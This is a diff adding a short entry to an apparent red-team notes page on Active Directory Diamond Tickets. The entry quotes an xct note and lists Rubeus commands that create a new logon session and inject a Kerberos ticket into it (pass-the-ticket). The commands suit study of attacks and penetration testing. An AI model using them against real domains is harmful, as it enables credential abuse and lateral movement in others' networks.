@@ -33,6 +33,17 @@ Diamond Tickets
 ```
 
 
+[xct Using Credentials](https://notes.vulndev.io/wiki/redteam/active-directory/using-credentials): *"A logon session can only accommodate one TGT at a time, therefore its sometimes required to create another session before applying a TGT to it."*
+```powershell
+Rubeus triage
+Rubeus createnetonly /program:c:\windows\system32\cmd.exe
+Rubeus triage
+Rubeus ptt /luid:<luid> /ticket:<ticket>
+```
+
+
+
 ## References
 
 [Hacktricks - Diamond Tickets](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/diamond-ticket)
+[xct Using Credentials](https://notes.vulndev.io/wiki/redteam/active-directory/using-credentials)
